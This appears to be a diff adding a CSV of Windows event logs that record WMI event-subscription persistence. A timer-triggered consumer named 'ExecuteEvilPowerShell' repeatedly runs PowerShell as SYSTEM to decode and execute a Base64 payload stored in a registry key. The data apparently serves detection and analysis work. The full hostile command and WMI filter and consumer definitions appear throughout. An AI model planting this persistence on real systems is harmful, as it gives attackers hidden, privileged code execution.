@@ -1,0 +1,321 @@
+"_time",EventCode,Message
+"2017-09-19T23:44:10.000-0700",20,"WmiEventConsumer activity detected:
+EventType: WmiConsumerEvent
+UtcTime: 2017-09-20 06:44:10.618
+Operation: Created
+User: W10B1\Artanis
+Name:  ""ExecuteEvilPowerShell""
+Type: Command Line
+Destination:  ""powershell.exe -NoP -C \""iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\\SOFTWARE\\PayloadKey -Name PayloadValue).PayloadValue)))\"""""
+"2017-09-19T23:44:10.000-0700",5861,"Namespace = //./root/subscription; Eventfilter = TimerTrigger (refer to its activate eventid:5859); Consumer = CommandLineEventConsumer=""ExecuteEvilPowerShell""; PossibleCause = Binding EventFilter: 
+instance of __EventFilter
+{
+	CreatorSID = {1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 61, 142, 116, 171, 40, 226, 113, 232, 97, 254, 162, 59, 233, 3, 0, 0};
+	EventNamespace = ""root/cimv2"";
+	Name = ""TimerTrigger"";
+	Query = ""SELECT * FROM __TimerEvent WHERE TimerID = 'PayloadTrigger'"";
+	QueryLanguage = ""WQL"";
+};
+Perm. Consumer: 
+instance of CommandLineEventConsumer
+{
+	CommandLineTemplate = ""powershell.exe -NoP -C \""iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\\SOFTWARE\\PayloadKey -Name PayloadValue).PayloadValue)))\"""";
+	CreatorSID = {1, 5, 0, 0, 0, 0, 0, 5, 21, 0, 0, 0, 61, 142, 116, 171, 40, 226, 113, 232, 97, 254, 162, 59, 233, 3, 0, 0};
+	Name = ""ExecuteEvilPowerShell"";
+};"
+"2017-09-19T23:44:22.000-0700",400,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.14393.206
+	HostId=9ebd19fb-d695-44ec-a9b1-51d48db8b1ef
+	HostApplication=powershell.exe -NoP -C iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))
+	EngineVersion=5.1.14393.206
+	RunspaceId=0a4191f5-9ee9-417b-9ebe-fbb73aa20b37
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+"2017-09-19T23:44:22.000-0700",1,"Process Create:
+UtcTime: 2017-09-20 06:44:22.603
+ProcessGuid: {84C16840-0E46-59C2-0000-00103A711100}
+ProcessId: 1756
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine: powershell.exe -NoP -C ""iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))""
+CurrentDirectory: C:\Windows\system32\
+User: NT AUTHORITY\SYSTEM
+LogonGuid: {84C16840-0DD4-59C2-0000-0020E7030000}
+LogonId: 0x3E7
+TerminalSessionId: 0
+IntegrityLevel: System
+Hashes: SHA1=044A0CF1F6BC478A7172BF207EEF1E201A18BA02,MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453
+ParentProcessGuid: {84C16840-0DDF-59C2-0000-001086EA0200}
+ParentProcessId: 2448
+ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
+ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe"
+"2017-09-19T23:44:22.000-0700",1,"Process Create:
+UtcTime: 2017-09-20 06:44:22.617
+ProcessGuid: {84C16840-0E46-59C2-0000-001040731100}
+ProcessId: 4492
+Image: C:\Windows\System32\conhost.exe
+CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+CurrentDirectory: C:\Windows
+User: NT AUTHORITY\SYSTEM
+LogonGuid: {84C16840-0DD4-59C2-0000-0020E7030000}
+LogonId: 0x3E7
+TerminalSessionId: 0
+IntegrityLevel: System
+Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354,MD5=D752C96401E2540A443C599154FC6FA9,SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0,IMPHASH=2C980A4DA7C717CC670CB9E1D2C4D733
+ParentProcessGuid: {84C16840-0E46-59C2-0000-00103A711100}
+ParentProcessId: 1756
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: powershell.exe -NoP -C ""iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))"""
+"2017-09-19T23:44:23.000-0700",403,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.14393.206
+	HostId=9ebd19fb-d695-44ec-a9b1-51d48db8b1ef
+	HostApplication=powershell.exe -NoP -C iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))
+	EngineVersion=5.1.14393.206
+	RunspaceId=0a4191f5-9ee9-417b-9ebe-fbb73aa20b37
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+"2017-09-19T23:44:34.000-0700",1,"Process Create:
+UtcTime: 2017-09-20 06:44:34.564
+ProcessGuid: {84C16840-0E52-59C2-0000-00103AE71100}
+ProcessId: 6652
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine: powershell.exe -NoP -C ""iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))""
+CurrentDirectory: C:\Windows\system32\
+User: NT AUTHORITY\SYSTEM
+LogonGuid: {84C16840-0DD4-59C2-0000-0020E7030000}
+LogonId: 0x3E7
+TerminalSessionId: 0
+IntegrityLevel: System
+Hashes: SHA1=044A0CF1F6BC478A7172BF207EEF1E201A18BA02,MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453
+ParentProcessGuid: {84C16840-0DDF-59C2-0000-001086EA0200}
+ParentProcessId: 2448
+ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
+ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe"
+"2017-09-19T23:44:34.000-0700",1,"Process Create:
+UtcTime: 2017-09-20 06:44:34.569
+ProcessGuid: {84C16840-0E52-59C2-0000-0010A4E71100}
+ProcessId: 4492
+Image: C:\Windows\System32\conhost.exe
+CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+CurrentDirectory: C:\Windows
+User: NT AUTHORITY\SYSTEM
+LogonGuid: {84C16840-0DD4-59C2-0000-0020E7030000}
+LogonId: 0x3E7
+TerminalSessionId: 0
+IntegrityLevel: System
+Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354,MD5=D752C96401E2540A443C599154FC6FA9,SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0,IMPHASH=2C980A4DA7C717CC670CB9E1D2C4D733
+ParentProcessGuid: {84C16840-0E52-59C2-0000-00103AE71100}
+ParentProcessId: 6652
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: powershell.exe -NoP -C ""iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))"""
+"2017-09-19T23:44:35.000-0700",400,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.14393.206
+	HostId=32660854-c5f0-4c62-a80b-486ea012eceb
+	HostApplication=powershell.exe -NoP -C iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))
+	EngineVersion=5.1.14393.206
+	RunspaceId=746b3d11-850e-4737-9dfa-75cab74f91ec
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+"2017-09-19T23:44:35.000-0700",403,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.14393.206
+	HostId=32660854-c5f0-4c62-a80b-486ea012eceb
+	HostApplication=powershell.exe -NoP -C iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))
+	EngineVersion=5.1.14393.206
+	RunspaceId=746b3d11-850e-4737-9dfa-75cab74f91ec
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+"2017-09-19T23:44:46.000-0700",1,"Process Create:
+UtcTime: 2017-09-20 06:44:46.563
+ProcessGuid: {84C16840-0E5E-59C2-0000-0010222C1300}
+ProcessId: 7036
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine: powershell.exe -NoP -C ""iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))""
+CurrentDirectory: C:\Windows\system32\
+User: NT AUTHORITY\SYSTEM
+LogonGuid: {84C16840-0DD4-59C2-0000-0020E7030000}
+LogonId: 0x3E7
+TerminalSessionId: 0
+IntegrityLevel: System
+Hashes: SHA1=044A0CF1F6BC478A7172BF207EEF1E201A18BA02,MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453
+ParentProcessGuid: {84C16840-0DDF-59C2-0000-001086EA0200}
+ParentProcessId: 2448
+ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
+ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe"
+"2017-09-19T23:44:46.000-0700",1,"Process Create:
+UtcTime: 2017-09-20 06:44:46.566
+ProcessGuid: {84C16840-0E5E-59C2-0000-00108C2C1300}
+ProcessId: 7064
+Image: C:\Windows\System32\conhost.exe
+CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+CurrentDirectory: C:\Windows
+User: NT AUTHORITY\SYSTEM
+LogonGuid: {84C16840-0DD4-59C2-0000-0020E7030000}
+LogonId: 0x3E7
+TerminalSessionId: 0
+IntegrityLevel: System
+Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354,MD5=D752C96401E2540A443C599154FC6FA9,SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0,IMPHASH=2C980A4DA7C717CC670CB9E1D2C4D733
+ParentProcessGuid: {84C16840-0E5E-59C2-0000-0010222C1300}
+ParentProcessId: 7036
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: powershell.exe -NoP -C ""iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))"""
+"2017-09-19T23:44:47.000-0700",400,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.14393.206
+	HostId=aa0fe292-8c3e-4779-8338-4ea2007c9d89
+	HostApplication=powershell.exe -NoP -C iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))
+	EngineVersion=5.1.14393.206
+	RunspaceId=dfd3e071-35a7-42ba-9f64-317989e4ec2b
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+"2017-09-19T23:44:47.000-0700",403,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.14393.206
+	HostId=aa0fe292-8c3e-4779-8338-4ea2007c9d89
+	HostApplication=powershell.exe -NoP -C iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))
+	EngineVersion=5.1.14393.206
+	RunspaceId=dfd3e071-35a7-42ba-9f64-317989e4ec2b
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+"2017-09-19T23:44:58.000-0700",400,"Engine state is changed from None to Available. 
+
+Details: 
+	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.14393.206
+	HostId=3068a4e4-236f-4f9e-b7ba-664d07367123
+	HostApplication=powershell.exe -NoP -C iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))
+	EngineVersion=5.1.14393.206
+	RunspaceId=24343bb0-1aa0-4f05-acdb-8e32739e77fb
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
+"2017-09-19T23:44:58.000-0700",1,"Process Create:
+UtcTime: 2017-09-20 06:44:58.563
+ProcessGuid: {84C16840-0E6A-59C2-0000-001080411400}
+ProcessId: 2220
+Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+CommandLine: powershell.exe -NoP -C ""iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))""
+CurrentDirectory: C:\Windows\system32\
+User: NT AUTHORITY\SYSTEM
+LogonGuid: {84C16840-0DD4-59C2-0000-0020E7030000}
+LogonId: 0x3E7
+TerminalSessionId: 0
+IntegrityLevel: System
+Hashes: SHA1=044A0CF1F6BC478A7172BF207EEF1E201A18BA02,MD5=097CE5761C89434367598B34FE32893B,SHA256=BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453
+ParentProcessGuid: {84C16840-0DDF-59C2-0000-001086EA0200}
+ParentProcessId: 2448
+ParentImage: C:\Windows\System32\wbem\WmiPrvSE.exe
+ParentCommandLine: C:\Windows\system32\wbem\wmiprvse.exe"
+"2017-09-19T23:44:58.000-0700",1,"Process Create:
+UtcTime: 2017-09-20 06:44:58.601
+ProcessGuid: {84C16840-0E6A-59C2-0000-0010F3421400}
+ProcessId: 3424
+Image: C:\Windows\System32\conhost.exe
+CommandLine: \??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1
+CurrentDirectory: C:\Windows
+User: NT AUTHORITY\SYSTEM
+LogonGuid: {84C16840-0DD4-59C2-0000-0020E7030000}
+LogonId: 0x3E7
+TerminalSessionId: 0
+IntegrityLevel: System
+Hashes: SHA1=00667A0F0C0D5E9DA697E9FF54ECDDD449259354,MD5=D752C96401E2540A443C599154FC6FA9,SHA256=046F7A1B4DE67562547ED9A180A72F481FC41E803DE49A96D7D7C731964D53A0,IMPHASH=2C980A4DA7C717CC670CB9E1D2C4D733
+ParentProcessGuid: {84C16840-0E6A-59C2-0000-001080411400}
+ParentProcessId: 2220
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: powershell.exe -NoP -C ""iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))"""
+"2017-09-19T23:44:59.000-0700",403,"Engine state is changed from Available to Stopped. 
+
+Details: 
+	NewEngineState=Stopped
+	PreviousEngineState=Available
+
+	SequenceNumber=15
+
+	HostName=ConsoleHost
+	HostVersion=5.1.14393.206
+	HostId=3068a4e4-236f-4f9e-b7ba-664d07367123
+	HostApplication=powershell.exe -NoP -C iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((Get-ItemProperty -Path HKLM:\SOFTWARE\PayloadKey -Name PayloadValue).PayloadValue)))
+	EngineVersion=5.1.14393.206
+	RunspaceId=24343bb0-1aa0-4f05-acdb-8e32739e77fb
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine="
